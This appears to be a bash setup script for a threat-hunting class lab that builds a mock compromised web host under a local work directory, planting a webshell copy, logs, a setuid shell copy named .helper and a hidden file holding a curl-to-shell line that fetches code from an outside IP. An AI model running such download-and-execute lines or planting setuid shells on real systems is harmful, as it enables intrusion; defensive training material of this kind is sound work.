#!/bin/bash
# =====================================================================
# Class 11 — Threat Hunting Lab :: scenario builder
# Stands up a small "compromised web host" tree you can hunt through.
# Safe: everything lives under ./work, nothing touches the real system.
# =====================================================================
#   ./setup.sh          build the scenario
#   ./setup.sh clean     remove ./work
# =====================================================================
set -e
cd "$(dirname "$0")"
WORK="./work"
SCEN="./scenario"

if [ "$1" = "clean" ]; then
  rm -rf "$WORK"
  echo "[*] Removed $WORK"
  exit 0
fi

echo "[*] Building scenario under $WORK ..."
rm -rf "$WORK"
mkdir -p "$WORK/var/www/html/uploads" "$WORK/var/log/archive" "$WORK/zeek" "$WORK/opt/bin" "$WORK/dev/shm"

# --- 1. Web root: a few benign files + one planted webshell ----------
cat > "$WORK/var/www/html/index.php"  <<'EOF'
<?php echo "SOC Command demo app"; ?>
EOF
cat > "$WORK/var/www/html/config.php" <<'EOF'
<?php $DB_HOST = "db.internal"; $DB_USER = "app"; ?>
EOF
cp "$SCEN/webshell.php" "$WORK/var/www/html/uploads/webshell.php"

# --- 2. Log archive: plain + gzipped, so recursive hunts have depth --
cp "$SCEN/web01_syslog.log" "$WORK/var/log/archive/syslog.1"
gzip -c "$SCEN/web01_syslog.log" > "$WORK/var/log/archive/syslog.2.gz"
cp "$SCEN/web01_syslog.log" "$WORK/var/log/syslog"

# --- 3. Zeek connection log for beacon hunting ----------------------
cp "$SCEN/conn.log" "$WORK/zeek/conn.log"

# --- 4. A planted "anomalous" SUID binary + world-writable exec ------
cp /bin/dash "$WORK/opt/bin/.helper" 2>/dev/null || cp /bin/sh "$WORK/opt/bin/.helper"
chmod 4755 "$WORK/opt/bin/.helper" || true
printf '#!/bin/sh\ncurl -s http://5.42.92.211/win/update.hta | sh\n' > "$WORK/dev/shm/.u"
chmod +x "$WORK/dev/shm/.u"

# --- 5. IOC list + CTI report handy inside the work dir -------------
cp "$SCEN/malicious_ips.txt" "$WORK/malicious_ips.txt"
cp "$SCEN/apt_report.txt"    "$WORK/apt_report.txt"

echo
echo "[+] Scenario ready. Key paths:"
echo "      web root      : $WORK/var/www/html"
echo "      log archive   : $WORK/var/log/archive"
echo "      zeek conn.log : $WORK/zeek/conn.log"
echo "      IOC list      : $WORK/malicious_ips.txt"
echo "      CTI report    : $WORK/apt_report.txt"
echo
echo "[>] Run the guided hunt:   ./hunt.sh"
echo "[>] Or step through it yourself using README.md"
